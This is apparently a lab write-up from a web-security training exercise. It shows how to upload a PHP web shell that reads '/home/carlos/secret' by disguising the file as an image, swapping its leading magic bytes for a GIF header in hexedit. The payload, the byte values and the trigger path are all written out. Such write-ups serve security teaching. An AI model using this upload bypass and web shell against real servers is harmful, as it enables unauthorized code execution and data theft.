# Remote code execution via polyglot web shell upload

I went to my account and entered the provided credentials **username=wiener and password=peter**. And then I shown up a page where there was option to upload an image.

This is the point where we can upload our web shell to read the file **/home/carlos/secret**. 

Firstly, we need create the payload, that is:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

save it into a .php file and upload it but make sure you capture the request in burpsuite and sent it to the repeater in order to analyze the server behaviour.

Upload it and you'll get the error: **Error: file is not a valid image Sorry, there was an error uploading your file**. Now we should try to change the magic bytes of the file.

Open the file using the command:

```bash
hexedit webShell.php
```

You will see that file is starting from the hex's: `3C 3F 70 68 70` that represents php file. Now, add `#######` at the start of the file and again open the file in hexedit and try to replace the starting hex's with : `47 49 46 38 37 61 20`.

Now try to upload the file. Yeah! File uploaded successfully. Trigger the file using path `/files/avatars/webShell.php` and boom! You will get your desired value.

